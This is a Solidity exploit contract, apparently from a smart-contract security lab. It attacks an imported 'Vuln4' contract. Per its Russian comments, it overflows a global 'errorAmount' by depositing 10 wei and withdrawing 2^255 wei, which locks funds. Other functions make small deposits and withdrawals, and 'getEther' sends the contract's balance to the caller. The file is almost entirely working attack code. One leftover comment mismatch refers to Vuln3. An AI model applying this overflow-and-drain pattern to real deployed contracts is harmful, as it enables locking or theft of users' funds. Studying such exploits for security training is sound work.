// SPDX-License-Identifier: UNLICENSED

pragma solidity >=0.8;


import "hardhat/console.sol";

import "./Vuln4.sol";



contract Exploit4 {

    address private owner;
    Vuln4 public vulnerableContract;
    

    constructor () payable {

        // запоминаем кто задеплоил эксплоит
        owner = msg.sender;
    }

    
    receive() external payable {
       
    }

    
    modifier OnlyOwner () {
        require(msg.sender == owner, "OnlyOwner");
        _;
    }

    // Сюда нужно передать адрес нужного контракта Vuln3.
    function InitExploit3 (address addr) public payable OnlyOwner {
        vulnerableContract = Vuln4(addr);
        
        
    }
    
    
    //переполнение глобальной errorAmount
    //блокировка средств
    function attack() public payable {
        vulnerableContract.deposit{value: 10 wei}();
       
        vulnerableContract.withdraw(57896044618658097711785492504343953926634992332820282019728792003956564819968 wei);
        
    }

    function setDep() public payable{
        vulnerableContract.deposit{value: 5 wei}();
    }

    function attackGet() public payable{
        vulnerableContract.withdraw(5 wei);
    }
    

    function getEther() public {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }
}